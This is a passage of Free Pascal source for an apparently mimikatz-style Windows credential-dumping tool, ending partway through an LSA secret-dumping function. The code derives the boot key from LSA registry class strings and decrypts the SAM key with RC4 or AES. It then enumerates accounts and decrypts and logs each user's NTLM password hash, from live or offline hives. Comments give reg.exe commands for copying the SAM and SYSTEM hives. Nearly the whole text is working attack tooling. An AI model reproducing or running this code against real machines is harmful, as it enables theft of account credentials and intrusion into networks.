unit usamutils;

{$mode delphi}

interface

uses
  windows,Classes, SysUtils,utils,uadvapi32,uofflinereg,ucryptoapi;

function getsyskey(var output:tbyte16):boolean;
function getsamkey(syskey:tbyte16;var output:tbyte16;server:string=''):boolean;
function dumphash(samkey:tbyte16;rid:dword;var output:tbyte16;var username:string):boolean;

//function dumpsecret(const syskey:tbyte16;regkey:string;var output:tbytes):boolean;
function dumpsecret(const syskey:tbyte16;regkey:string;var output:tbytes;val:string='CurrVal'):boolean;

function callback_SamUsers(param:pointer=nil):dword;stdcall;
function query_samusers(samkey:tbyte16;func:pointer =nil):boolean;

function resetdata(func:pointer =nil):boolean;

type tsamuser=record
     //could be a good idea to pass the handle to the reg key, offline/online
     samkey:tbyte16;
     rid:dword;
end;
psamuser=^tsamuser;

var
  offline:boolean=false;

implementation


function getclass_offline(hive:string;keyname,valuename:string;var bytes:array of byte):boolean;
var
  ret:word;
  hkey,hkresult:thandle;
  classSize:dword;
  classStr:array [0..15] of widechar;
  i:byte=0;
begin
uofflinereg.init ;
ret:=OROpenHive(pwidechar(widestring(hive)),hkey);
if ret<>0 then begin log('OROpenHive NOT OK',0);exit;end;
keyname:=keyname+'\'+valuename;
ret:=OROpenKey (hkey,pwidechar(widestring(keyname)),hkresult);
if ret<>0 then begin log('OROpenKey NOT OK',0);exit;end;
classSize := 8+1;
ret:=ORQueryInfoKey(hkresult,@classStr[0],@classSize,nil,nil,nil,nil,nil,nil,nil,nil);
if (classSize=8) then
      begin
       while i<8 do
             begin
             bytes[i div 2]:=strtoint('$'+classStr[I]+classStr[i+1]);
             inc(I,2);
             end;
       result:=true;
       end;//if (classSize=8) then
ret:=ORcloseKey (hkresult);
ret:=ORCloseHive (hkey);
end;

function getclass(rootkey:hkey;keyname,valuename:string;var bytes:array of byte):boolean;
var
  ret:long;
  hKeyReg,topKey,hSubKey:thandle;
  dwDisposition:dword=0;
  classSize:dword;
  classStr:array [0..15] of widechar;
  i:byte=0;
begin
result:=false;
ret := RegCreateKeyEx(rootkey,pchar(keyName),0,nil,REG_OPTION_NON_VOLATILE,KEY_QUERY_VALUE,nil,topKey,@dwDisposition);
if ret=error_success then
  begin
  if (RegOpenKeyEx(topKey,pchar(valueName),0,KEY_READ,hSubKey)=ERROR_SUCCESS) then
    begin
    classSize := 8+1;
    fillchar(classStr ,sizeof(classStr ),0);
    ret := RegQueryInfoKeyw(hSubKey,@classStr[0],@classSize,nil,nil,nil,nil,nil,nil,nil,nil,nil);
    if (classSize=8) then
      begin
       while i<8 do
             begin
             bytes[i div 2]:=strtoint('$'+classStr[I]+classStr[i+1]);
             inc(I,2);
             end;
       result:=true;
       end;//if (classSize=8) then
    RegCloseKey(hSubKey);
    end;
  RegCloseKey(topKey);
  end;
end;

{*
 * Get hidden syskey encoded bytes part in class string of a reg key
 * (JD, Skew1, GBG, Data)
 *}
function get_encoded_syskey(var bytes:array of byte):boolean;
const keys:array[0..3] of string=('JD','Skew1','GBG','Data');
var
  i:byte;
  enc_bytes:array[0..3] of byte;
begin
result:=false;
for i:=0 to length(keys)-1 do
    begin
    if offline=false
       then result:=getclass (HKEY_LOCAL_MACHINE ,'SYSTEM\CurrentControlSet\Control\Lsa',keys[i],enc_bytes)
       else result:=getclass_offline  ('system.sav' ,'ControlSet001\Control\Lsa',keys[i],enc_bytes);
    CopyMemory (@bytes[i*4],@enc_bytes[0],4);
    end;
end;

//reg.exe save hklm\system c:\temp\system.sav
//also known as bootkey
function getsyskey(var output:tbyte16):boolean;
const
  syskeyPerm:array[0..15] of byte=($8,$5,$4,$2,$b,$9,$d,$3,$0,$6,$1,$c,$e,$a,$f,$7);
var
  bytes:array[0..15] of byte;
  //syskey:tbyte16;
  i:byte;
  //dummy:string;
begin
log('**** getsyskey ****');
result:=false;
//get the encoded syskey
result:=get_encoded_syskey(bytes);
//Get syskey raw bytes (using permutation)
for i:=0 to sizeof(bytes)-1 do output[i] := bytes[syskeyPerm[i]];
end;

//see kuhl_m_lsadump_getSamKey in kuhl_m_lsadump_getSamKey
function gethashedbootkeyRC4(salt,syskey:tbyte16;samkey:array of byte;var hashed_bootkey:tbyte16):boolean;
const
  SAM_QWERTY:ansistring='!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%'#0;
  SAM_NUM:ansistring='0123456789012345678901234567890123456789'#0;
  password:pansichar='password';
var
  md5ctx:md5_ctx;
  data:_CRYPTO_BUFFER; //= (SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey),
  key:_CRYPTO_BUFFER; // = (MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest);
  status:ntstatus;
  buffer:array of byte;
begin
//based on the first byte of F
//md5/rc4 on "old" ntlm
        result:=false;

        //test
        {
        MD5Init(md5ctx);
        MD5Update(md5ctx ,password^,strlen(password)); //a buffer, not a pointer - password[0] would work too
        MD5Final(md5ctx );
        writeln('expected:5F4DCC3B5AA765D61D8327DEB882CF99');
        writeln('result  :'+HashByteToString (md5ctx.digest ));
        setlength(buffer,strlen(password));
        copymemory(@buffer[0],password,strlen(password));
        MD5Init(md5ctx);
        MD5Update(md5ctx ,pchar(buffer)^,strlen(password)); //a buffer, not a pointer - buffer[0] would work too
        MD5Final(md5ctx );
        writeln('expected:5F4DCC3B5AA765D61D8327DEB882CF99');
        writeln('result  :'+HashByteToString (md5ctx.digest ));
        }
        //
        fillchar(md5ctx,sizeof(md5ctx ),0);
        MD5Init(md5ctx);
	MD5Update(md5ctx,salt ,SAM_KEY_DATA_SALT_LENGTH); //F[0x70:0x80]=SALT
	MD5Update(md5ctx,pansichar(SAM_QWERTY)^,length(SAM_QWERTY)); //46
	MD5Update(md5ctx,syskey,SYSKEY_LENGTH);  //16
	MD5Update(md5ctx,pansichar(SAM_NUM)^,length(SAM_NUM)); //40
	MD5Final(md5ctx); //rc4_key = MD5(F[0x70:0x80] + aqwerty + bootkey + anum)
        log('RC4Key:'+ByteToHexaString (md5ctx.digest),0);
        //in and out
        fillchar(data,sizeof(data),0);
        data.Length :=SAM_KEY_DATA_KEY_LENGTH;
        data.MaximumLength :=SAM_KEY_DATA_KEY_LENGTH;
        data.Buffer :=samkey; //F[0x80:0xA0]=SAMKEY encrypted
        //in only
        fillchar(key,sizeof(key),0);
        key.Length:=MD5_DIGEST_LENGTH;
        key.MaximumLength:=MD5_DIGEST_LENGTH;
        key.Buffer:=md5ctx.digest ;  //rc4_key
        status:=RtlEncryptDecryptRC4(data,key);
        if status<>0 then log('RtlEncryptDecryptRC4 NOT OK',0) else log('RtlEncryptDecryptRC4 OK',0);
        result:=status=0;
        if status=0 then CopyMemory(@hashed_bootkey [0],data.Buffer ,sizeof(hashed_bootkey)) ;


end;

//also known as hashed bootkey
function getsamkey_offline(syskey:tbyte16;var output:tbyte16):boolean;
var
  ret:word;
  hkey,hkresult:thandle;
  //data:array[0..1023] of byte;
  data:tbytes;
  salt,aesdata,IV:tbyte16;
  encrypted_samkey:array[0..31] of byte;
  bytes:tbyte16;
  ptr:pointer;
  cbdata:integer;
begin
result:=false;


MyOrQueryValue('sam.sav','sam\Domains\account','F',data);
cbdata:=length(data);

if cbdata<=0 then begin log('getvaluePTR NOT OK',0);exit;end;

log('getvaluePTR OK '+inttostr(cbdata)+' read',0);

     //writeln(data[0]);
     if data[0]=3 then
       begin
       log('AES MODE',0);
       CopyMemory(@iv[0],@data[$78],sizeof(iv)) ;
       CopyMemory(@aesdata[0],@data[$88],sizeof(aesdata)) ;//Only 16 bytes needed
       fillchar(output,sizeof(output),0);
       log('key:'+ByteToHexaString (syskey),0);
       log('iv:'+ByteToHexaString (iv),0);
       log('data:'+ByteToHexaString (aesdata),0);
       result:=DecryptAES128(syskey ,iv,aesdata,output);
       end
       else
       begin
        CopyMemory(@salt[0],@data[$70],sizeof(salt)) ;
        CopyMemory(@encrypted_samkey[0],@data[$80],sizeof(tbyte16)) ;
        //writeln('SAMKey:'+HashByteToString (samkey));
        result:= gethashedbootkeyRC4(salt,syskey,encrypted_samkey,tbyte16(output)); //=true then writeln('SAMKey:'+HashByteToString (tbyte16(bytes)));
       end;

end;

//also known as hashed bootkey
function getsamkey(syskey:tbyte16;var output:tbyte16;server:string=''):boolean;
var
  ret:long;
  topkey:thandle;
  cbdata,lptype:dword;
  //data:array[0..1023] of byte;
  data:tbytes;
  salt,iv,aesdata:tbyte16;
  encrypted_samkey:array[0..31] of byte;
  //bytes:array[0..15] of byte;
begin
log('**** getsamkey ****');
result:=false;
if offline=true then
   begin
   result:=getsamkey_offline(syskey,output);
   exit;
   end;
//only if run as system
//contains our salt and encrypted sam key
if MyRegQueryValue(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account'),pchar('F'),data,server)=true then
  begin
  log('MyRegQueryValue OK',0);
  cbdata:=length(data);

     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
     //writeln(data[0]);
     if data[0]=3 then
     begin
     log('AES MODE',0);
     CopyMemory(@iv[0],@data[$78],sizeof(iv)) ;
     CopyMemory(@aesdata[0],@data[$88],sizeof(aesdata)) ;//Only 16 bytes needed
     fillchar(output,sizeof(output),0);
     log('key:'+ByteToHexaString (syskey),0);
     log('iv:'+ByteToHexaString (iv),0);
     log('data:'+ByteToHexaString (aesdata),0);
     result:=DecryptAES128(syskey ,iv,aesdata,output);
     end
     else //if data[0]=3 then
     begin
     CopyMemory(@salt[0],@data[$70],sizeof(salt)) ;
     CopyMemory(@encrypted_samkey[0],@data[$80],sizeof(tbyte16)) ;
     //writeln('SAMKey:'+HashByteToString (samkey));
     result:= gethashedbootkeyRC4(salt,syskey,encrypted_samkey,tbyte16(output)); //=true then writeln('SAMKey:'+HashByteToString (tbyte16(bytes)));
     end; //if data[0]=3 then

  end
  else log('MyRegQueryValue NOT OK:'+inttostr(getlasterror),0);

end;



function decrypthashRC4(samkey:array of byte;var hash:tbyte16;rid_:dword):boolean;
const
  NTPASSWORD:ansistring = 'NTPASSWORD'#0;
  LMPASSWORD:ansistring = 'LMPASSWORD';
  //bytesrid:array[0..3] of byte =($f4,$01,$00,$00);  //($00,$00,$01,$f4); //500 becomes '000001f4' then reversed
var
  md5ctx:md5_ctx;
  key:_CRYPTO_BUFFER; //{MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
  cypheredHashBuffer:_CRYPTO_BUFFER; //{0, 0, NULL}
  status:ntstatus;
  i:byte;
  data:array[0..15] of byte;
begin
result:=false;
//STEP4, use SAM-/Syskey to RC4/AES decrypt the Hash
fillchar(md5ctx,sizeof(md5ctx ),0);
MD5Init(md5ctx);
MD5Update(md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
MD5Update(md5ctx, rid_, sizeof(DWORD));
MD5Update(md5ctx, pansichar(NTPASSWORD)^,length(NTPASSWORD));
MD5Final(md5ctx);
log('RC4Key:'+ByteToHexaString (md5ctx.digest ));
//
//in and out
fillchar(cypheredHashBuffer,sizeof(cypheredHashBuffer),0);
cypheredHashBuffer.Length :=16;
cypheredHashBuffer.MaximumLength := 16 ; //pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
cypheredHashBuffer.Buffer := hash;
// in
key.Length  :=MD5_DIGEST_LENGTH;
key.MaximumLength :=MD5_DIGEST_LENGTH;
key.Buffer :=md5ctx.digest;
status := RtlEncryptDecryptRC4(cypheredHashBuffer, key );
if status<>0 then log('RtlEncryptDecryptRC4 NOT OK',0) else log('RtlEncryptDecryptRC4 OK',0);


result:=status=0;
exit;

//STEP5, use DES derived from RID to fully decrypt the Hash
//moved to dumphash to handle both rc4 and aes
for i := 0 to cypheredHashBuffer.Length -1 do
  begin
  //i := i+ 16; //LM_NTLM_HASH_LENGTH; //?
  status:=RtlDecryptDES2blocks1DWORD(cypheredHashBuffer.Buffer  + i, @rid_, data);
  if status=0 then
              begin
              //writeln('ok:'+HashByteToString (data)); //debug
              copymemory(@hash[0],@data[0],16);
              result:=status=0;
              break;
              end
              else writeln('not ok')
  end;
end;

function _decrypthash(data:array of byte;samkey:tbyte16;rid:dword;var output:tbyte16;var username:string):boolean;
var
  aeshash_offset,hash_offset,hash_length,name_offset,name_length,iv_offset:dword;
  name:array [0..254] of widechar;
  bytes,iv,aesdata:tbyte16;
  i:byte;
  status:ntstatus;
  ret:boolean;
begin
result:=false;
//username
     copymemory(@name_offset,@data[$0C],sizeof(name_offset));
     name_offset := name_offset + $CC;
     copymemory(@name_length,@data[$10],sizeof(name_length));
     fillchar(name,sizeof(name),0);
     CopyMemory(@name[0],@data[name_offset],name_length -1 );
     username:=strpas(name);
     //
     copymemory(@hash_length,@data[$AC],sizeof(hash_length));
     log('hash_length:'+inttostr(hash_length),0);
     copymemory(@hash_offset,@data[$A8],sizeof(hash_offset));
     hash_offset:=hash_offset+$CC+4; //the first 4 bytes are a header (revision, etc?)
     log('hash Offset:'+inttohex(hash_offset,4),0);
     //see https://github.com/tijldeneut/Security/blob/master/DumpSomeHashes/DumpSomeHashesAuto.py
     if hash_length =$4 then    //no password
     begin
     fillchar(output,sizeof(output),0);
     result:=true;
     exit;
     end;
     if hash_length =$38 then    //aes
     begin
     log('AES MODE',0);
     //hash_offset:=hash_offset+4;  //actually matches the IV offset??
     aeshash_offset:=hash_offset+24-4;
     iv_offset:=hash_offset+8-4;
     //copymemory(@iv_offset,@data[$B4],sizeof(iv_offset));
     //iv_offset:=iv_offset+$CC; //rubbish for now but actialy is 16 bytes after actual IV offset??
     log('IV Offset:'+inttohex(iv_offset,4),0);
     CopyMemory(@iv[0],@data[iv_offset],sizeof(iv)) ;
     CopyMemory(@aesdata[0],@data[aeshash_offset],sizeof(aesdata)) ;//Only 16 bytes needed
     fillchar(output,sizeof(output),0); //crashes in win32?
     log('key:'+ByteToHexaString (samkey),0);
     log('iv:'+ByteToHexaString (iv),0);
     log('data:'+ByteToHexaString (aesdata),0);
     ret:=DecryptAES128(samkey ,iv,aesdata,output);
     end;
     if hash_length =$14 then //rc4
     begin
     log('RC4 MODE',0);
     CopyMemory(@output[0],@data[hash_offset],sizeof(output)) ;
     log('Encrypted Hash:'+ByteToHexaString (output),0);
     ret:=decrypthashRC4(samkey ,output,rid);
     end;

     if ret=true then
          begin

          if (hash_length =$14) or (hash_length =$38) then
          begin
          //STEP5, use DES derived from RID to fully decrypt the Hash
          //see kuhl_m_lsadump_dcsync_decrypt in mimikatz
          for i := 0 to 15 do
            begin
            //i := i+ 16; //LM_NTLM_HASH_LENGTH; //?
            //try
              fillchar(data,sizeof(data),0);
              status:=RtlDecryptDES2blocks1DWORD(@output[0] +i , @rid, bytes);
            //except
            //on e:exception do log(e.message,0);
            //end;
            //status:=0;
            if status=0 then
                        begin
                        //writeln('ok:'+HashByteToString (data)); //debug
                        copymemory(@output[0],@bytes[0],16);
                        //writeln('done');
                        result:=status=0;
                        break;
                        end //if status=0 then
                        else log('RtlDecryptDES2blocks1DWORD NOT OK',0)
          end; //for i := 0 to 15 do
          end; //if (hash_length =$20) or (hash_length =$38) then

          end; //if result=true then


end;



//reg.exe save hklm\sam c:\temp\sam.sav
//see https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
function dumphash_offline(samkey:tbyte16;rid:dword;var output:tbyte16;var username:string):boolean;
var
  ret:word;
  hkey,hkresult:thandle;
  cbdata:longword;
  //data:array[0..1023] of byte;
  data:tbytes;
  bytes,iv,aesdata:tbyte16;
  aeshash_offset,hash_offset,hash_length,name_offset,name_length,iv_offset:dword;
  name:array [0..254] of widechar;
  ptr:pointer;
  i:byte;
  status:ntstatus;
  bret:boolean;
begin
result:=false;

log('RID:'+inttohex(rid,8),0);

MyOrQueryValue('sam.sav','sam\Domains\account\users\'+inttohex(rid,8),'V',data);
cbdata:=length(data);

if (cbdata=0) or (cbdata<$AC)
     then
     log('MyOrQueryValue NOT OK',0)
     else //if cbdata<=0
     begin
     log('MyOrQueryValue OK '+inttostr(cbdata)+' read',0);

     result:=_decrypthash (data,samkey ,rid,output ,username);

     {

     //username
     copymemory(@name_offset,@data[$0C],sizeof(name_offset));
     name_offset := name_offset + $CC;
     copymemory(@name_length,@data[$10],sizeof(name_length));
     fillchar(name,sizeof(name),0);
     CopyMemory(@name[0],@data[name_offset],name_length -1 );
     username:=strpas(name);
     //
     copymemory(@hash_length,@data[$AC],sizeof(hash_length));
     log('hash_length:'+inttostr(hash_length),0);
     copymemory(@hash_offset,@data[$A8],sizeof(hash_offset));
     hash_offset:=hash_offset+$CC+4; //the first 4 bytes are a header (revision, etc?)
     log('hash Offset:'+inttohex(hash_offset,4),0);
     //see https://github.com/tijldeneut/Security/blob/master/DumpSomeHashes/DumpSomeHashesAuto.py
     if hash_length =$38 then    //aes
     begin
     log('AES MODE',0);
     //hash_offset:=hash_offset+4;  //actually matches the IV offset??
     aeshash_offset:=hash_offset+24-4;
     iv_offset:=hash_offset+8-4;
     //copymemory(@iv_offset,@data[$B4],sizeof(iv_offset));
     //iv_offset:=iv_offset+$CC; //rubbish for now but actialy is 16 bytes after actual IV offset??
     log('IV Offset:'+inttohex(iv_offset,4),0);
     CopyMemory(@iv[0],@data[iv_offset],sizeof(iv)) ;
     CopyMemory(@aesdata[0],@data[aeshash_offset],sizeof(aesdata)) ;//Only 16 bytes needed
     fillchar(output,sizeof(output),0); //crashes in win32?
     log('key:'+HashByteToString (samkey),0);
     log('iv:'+HashByteToString (iv),0);
     log('data:'+HashByteToString (aesdata),0);
     bret:=DecryptAES128(samkey ,iv,aesdata,output);
     end;
     if hash_length =$14 then //rc4
     begin
     CopyMemory(@output[0],@data[hash_offset],sizeof(output)) ;
     log('Encrypted Hash:'+HashByteToString (output),0);
     bret:=decrypthashRC4(samkey ,output,rid);
     end;
     end; //if cbdata<=0

     if bret=true then
     begin

     if (hash_length =$14) or (hash_length =$38) then
     begin
     //STEP5, use DES derived from RID to fully decrypt the Hash
     //see kuhl_m_lsadump_dcsync_decrypt in mimikatz
     for i := 0 to 15 do
       begin
       //i := i+ 16; //LM_NTLM_HASH_LENGTH; //?
       //try
         fillchar(data,sizeof(data),0);
         status:=RtlDecryptDES2blocks1DWORD(@output[0] +i , @rid, bytes);
       //except
       //on e:exception do log(e.message,0);
       //end;
       //status:=0;
       if status=0 then
                   begin
                   //writeln('ok:'+HashByteToString (data)); //debug
                   copymemory(@output[0],@bytes[0],16);
                   //writeln('done');
                   result:=status=0;
                   break;
                   end //if status=0 then
                   else log('RtlDecryptDES2blocks1DWORD NOT OK',0)
     end; //for i := 0 to 15 do
     end; //if (hash_length =$20) or (hash_length =$38) then

     end; //if bret=true then
     }
     end;//if (cbdata=0) or (cbdata<$AC)



end;

//reg.exe save hklm\sam c:\temp\sam.save
//see https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
function dumphash(samkey:tbyte16;rid:dword;var output:tbyte16;var username:string):boolean;
var
  ret:long;
  topkey:thandle;
  cbdata,lptype:dword;
  //data:array[0..1023] of byte;
  data:tbytes;
  iv,aesdata:tbyte16;
  aeshash_offset,hash_offset,hash_length,name_offset,name_length,iv_offset:dword;
  name:array [0..254] of widechar;
  i:byte;
  status:ntstatus;
  bret:boolean;
begin
result:=false;
if offline=true then
            begin
            try
            result:=dumphash_offline(samkey,rid,output,username);
            except
            on e:exception do
               begin
               if e.classname='EAccessViolation' then result:=true; //SHAME !!!!!!!!!!
               log(e.message,0 );
               end;
            end;
            //writeln('after dumphash_offline');
            exit;
            end;
//only if run as system
if MyRegQueryValue(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account\users\'+inttohex(rid,8)),pchar('V'),data)=true then
  begin
  log('RegCreateKeyEx OK',0);
  cbdata:=length(data);
  if (ret=0) and (cbdata>$AC) then
     begin
     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
     result:=_decrypthash (data,samkey ,rid,output ,username);
     end;


    exit;

    // DONE ???????????????????????????????????????????????
    // remove below ??

  if (ret=0) and (cbdata>$AC) then
     begin
     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
     //username
     copymemory(@name_offset,@data[$0C],sizeof(name_offset));
     name_offset := name_offset + $CC;
     copymemory(@name_length,@data[$10],sizeof(name_length));
     fillchar(name,sizeof(name),0);
     CopyMemory(@name[0],@data[name_offset],name_length );
     username:=strpas(name);
     //
     copymemory(@hash_length,@data[$AC],sizeof(hash_length));
     log('hash_length:'+inttostr(hash_length),0);
     copymemory(@hash_offset,@data[$A8],sizeof(hash_offset));
     hash_offset:=hash_offset+$CC+4; //the first 4 bytes are a header (revision, etc?)
     log('hash Offset:'+inttohex(hash_offset,4),0);
     //see https://github.com/tijldeneut/Security/blob/master/DumpSomeHashes/DumpSomeHashesAuto.py
     if hash_length =$38 then    //aes
     begin
     log('AES MODE',0);
     //hash_offset:=hash_offset+4;  //actually matches the IV offset??
     aeshash_offset:=hash_offset+24-4;
     iv_offset:=hash_offset+8-4;
     //copymemory(@iv_offset,@data[$B4],sizeof(iv_offset));
     //iv_offset:=iv_offset+$CC; //rubbish for now but actialy is 16 bytes after actual IV offset??
     log('IV Offset:'+inttohex(iv_offset,4),0);
     CopyMemory(@iv[0],@data[iv_offset],sizeof(iv)) ;
     CopyMemory(@aesdata[0],@data[aeshash_offset],sizeof(aesdata)) ;//Only 16 bytes needed
     fillchar(output,sizeof(output),0);
     log('key:'+ByteToHexaString (samkey),0);
     log('iv:'+ByteToHexaString (iv),0);
     log('data:'+ByteToHexaString (aesdata),0);
     bret:=DecryptAES128(samkey ,iv,aesdata,output);
     end;
     if hash_length =$14 then //rc4
     begin
     CopyMemory(@output[0],@data[hash_offset],sizeof(output)) ;
     log('Encrypted Hash:'+ByteToHexaString (output),0);
     bret:=decrypthashRC4(samkey ,output,rid);
     end;
     end //if ret=0 then
     else log('RegOpenKeyEx NOT OK',0);
  end;


if bret=true then
begin

if (hash_length =$14) or (hash_length =$38) then
begin
//STEP5, use DES derived from RID to fully decrypt the Hash
//see kuhl_m_lsadump_dcsync_decrypt in mimikatz
for i := 0 to 15 do
  begin
  //i := i+ 16; //LM_NTLM_HASH_LENGTH; //?
  status:=RtlDecryptDES2blocks1DWORD(@output[0]  + i, @rid, data);
  if status=0 then
              begin
              //writeln('ok:'+HashByteToString (data)); //debug
              copymemory(@output[0],@data[0],16);
              result:=status=0;
              break;
              end //if status=0 then
              else log('RtlDecryptDES2blocks1DWORD NOT OK',0)
end; //for i := 0 to 15 do
end; //if (hash_length =$20) or (hash_length =$38) then

end; //if bret=true then

RegCloseKey(topkey);

end;

function query_samusers_offline(samkey:tbyte16;func:pointer =nil):boolean;
const
  MAX_KEY_LENGTH =255;
  MAX_VALUE_NAME =16383;
var
  ret:word;
  hkey,hkresult:thandle;
  i:byte;
  retcode,cbname:dword;
  achKey:array[0..MAX_KEY_LENGTH-1] of widechar;
  ftLastWriteTime:filetime;
  param:tsamuser;
begin
result:=false;

uofflinereg.init ;
ret:=OROpenHive(pwidechar(widestring('sam.sav')),hkey);
if ret<>0 then begin log('OROpenHive NOT OK',0);exit;end;
ret:=OROpenKey (hkey,pwidechar(widestring('sam\Domains\account\users')),hkresult);
if ret<>0 then begin log('OROpenKey NOT OK',0);exit;end;


result:=true;
for i:=0 to 254 do
  begin
            cbName := MAX_KEY_LENGTH;
            ret:=OREnumKey(hkresult,
                                i,
                                @achKey[0],
                                @cbName,
                                nil,
                                nil,
                                @ftLastWriteTime);

            if (ret <>ERROR_SUCCESS) then break;
            if (lowercase(strpas(achKey)))='names' then break;
            if func=nil then log( strpas(achKey)+' '+inttostr(strtoint('$'+strpas(achKey))),1);
            if func<>nil then
               begin
               param.samkey :=samkey;
               param.rid :=strtoint('$'+strpas(achKey));
               fn(func)(@param );

               end;
end;

end;

function callback_SamUsers(param:pointer=nil):dword;stdcall;
var
  bytes:tbyte16;
  username:string;
begin
  try
  fillchar(bytes,sizeof(bytes),0);
  if dumphash(psamuser(param).samkey,psamuser(param).rid,bytes,username)
          then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+ByteToHexaString(bytes) ,1)
          else log('gethash NOT OK for '+inttohex(psamuser(param).rid,8)+':'+username ,1);
  except
    on e:exception do
    begin
      if e.ClassName ='EAccessViolation' then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+ByteToHexaString(bytes) ,1);
      log(e.Message ,0); //SHAME!!!!!!!!!!!!!!
    end;
  end;
end;

function resetdata_offline(func:pointer =nil):boolean;
const
  MAX_KEY_LENGTH =255;
  MAX_VALUE_NAME =16383;
var
  ret:word;
  hkey,hkresult:thandle;
  i:byte;
  retcode,cbname:dword;
  achKey:array[0..MAX_KEY_LENGTH-1] of widechar;
  ftLastWriteTime:filetime;
  param:tsamuser;
begin
result:=false;

uofflinereg.init ;
ret:=OROpenHive(pwidechar(widestring('sam.sav')),hkey);
if ret<>0 then begin log('OROpenHive NOT OK',0);exit;end;
ret:=OROpenKey (hkey,pwidechar(widestring('sam\Domains\account\users')),hkresult);
if ret<>0 then begin log('OROpenKey NOT OK',0);exit;end;


result:=true;
for i:=0 to 254 do
  begin
            cbName := MAX_KEY_LENGTH;
            ret:=OREnumKey(hkresult,
                                i,
                                @achKey[0],
                                @cbName,
                                nil,
                                nil,
                                @ftLastWriteTime);

            if (ret <>ERROR_SUCCESS) then break;
            if (lowercase(strpas(achKey)))='names' then break;
            if func=nil then log( strpas(achKey)+' '+inttostr(strtoint('$'+strpas(achKey))),1);
            if func<>nil then
               begin
               {
               param.samkey :=samkey;
               param.rid :=strtoint('$'+strpas(achKey));
               fn(func)(@param );
               }
               end;
end;

end;

function resetdata(func:pointer =nil):boolean;
const
  MAX_KEY_LENGTH =255;
  MAX_VALUE_NAME =16383;
  REG_BINARY = 3;
var i:byte;
  retcode,cbname,cbdata,lptype:dword;
  achKey:array[0..MAX_KEY_LENGTH-1] of char;
  ftLastWriteTime:filetime;
  hKey,mykey:thandle;
  param:tsamuser;
  ret:long;
  data:tbytes;
begin
result:=false;
if offline=true then
                begin
                result:=resetdata_offline(func);
                exit;
                end;

retcode:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account\users'),0, KEY_READ, hKey);
if retcode<>0 then begin log('RegOpenKeyEx NOT OK',0);exit;end;
result:=true;
for i:=0 to 254 do
  begin
            cbName := MAX_KEY_LENGTH;
            retCode := RegEnumKeyEx(hKey, i,
                     @achKey[0],
                     cbName,
                     nil,
                     nil,
                     nil,
                     @ftLastWriteTime);
            if (retCode <>ERROR_SUCCESS) then break;
            if (lowercase(strpas(achKey)))='names' then break;
            if func=nil then
               begin
               log( strpas(achKey)+' '+inttostr(strtoint('$'+strpas(achKey))),0);
               ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account\users\'+achKey),0, KEY_READ, mykey);
               if ret=0 then
               begin
                 //LOG('SAM\sam\Domains\account\users\'+achKey);
                 log('RegOpenKeyEx OK',0);
                 cbdata:=1024;
                 lptype:=0;
                 ret := RegQueryValueex (mykey,'ResetData',nil,@lptype,nil,@cbdata);
                 if (ret=0) and (cbdata>0) then
                    begin
                    log('RegQueryValueex OK',0);
                    log('cbdata:'+inttostr(cbdata));
                    setlength(data,cbdata);
                    ret:=RegQueryValueex (mykey,'ResetData',nil,@lptype,@data[0],@cbdata);
                    if (ret=0) and (cbdata>0) then
                       begin
                       log('user:'+strpas(achKey)+':'+inttostr(strtoint('$'+strpas(achKey))),1);
                       log(BytetoAnsiString (@data[0],cbdata),1);
                       end;
                    end //if (ret=0) and (cbdata>0) then
                    else log('RegQueryValueex failed:'+inttostr(ret));
               RegCloseKey(mykey);
               end; //if ret=0 then
               end; //if func=nil then
            if func<>nil then
               begin
               {
               param.samkey :=samkey;
               param.rid :=strtoint('$'+strpas(achKey));
               fn(func)(@param );
               }
               end;
end;

end;

function query_samusers(samkey:tbyte16;func:pointer =nil):boolean;
const
  MAX_KEY_LENGTH =255;
  MAX_VALUE_NAME =16383;
var i:byte;
  retcode,cbname:dword;
  achKey:array[0..MAX_KEY_LENGTH-1] of char;
  ftLastWriteTime:filetime;
  hKey:thandle;
  param:tsamuser;
begin
result:=false;
if offline=true then
                begin
                result:=query_samusers_offline(samkey,func);
                exit;
                end;

retcode:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account\users'),0, KEY_READ, hKey);
if retcode<>0 then begin log('RegOpenKeyEx NOT OK',0);exit;end;
result:=true;
for i:=0 to 254 do
  begin
            cbName := MAX_KEY_LENGTH;
            retCode := RegEnumKeyEx(hKey, i,
                     @achKey[0],
                     cbName,
                     nil,
                     nil,
                     nil,
                     @ftLastWriteTime);
            if (retCode <>ERROR_SUCCESS) then break;
            if (lowercase(strpas(achKey)))='names' then break;
            if func=nil then log( strpas(achKey)+' '+inttostr(strtoint('$'+strpas(achKey))),1);
            if func<>nil then
               begin
               param.samkey :=samkey;
               param.rid :=strtoint('$'+strpas(achKey));
               fn(func)(@param );

               end;
end;

end;

//**********************************************************
function dumpsecret(const syskey:tbyte16;regkey:string;var output:tbytes;val:string='CurrVal'):boolean;
var
  ret:boolean;
  cbdata:dword;
  data,clearsecret,secret,system_key,key:tbytes; //array[0..1023] of byte;
begin
  result:=false;
  log('**** dumpsecret ****');
  //we should check PolRevision first to decide nt5 vs nt6
  //but also PolEKList" vs "PolSecretEncryptionKey
  if offline
     then ret:=MyOrQueryValue('security.sav',pchar('Policy\PolEKList'),pchar(''),data)
     else ret:=MyRegQueryValue(HKEY_LOCAL_MACHINE ,pchar('Security\Policy\PolEKList'),pchar(''),data);
  if ret then
  begin
    log('MyRegQueryValue OK',0);
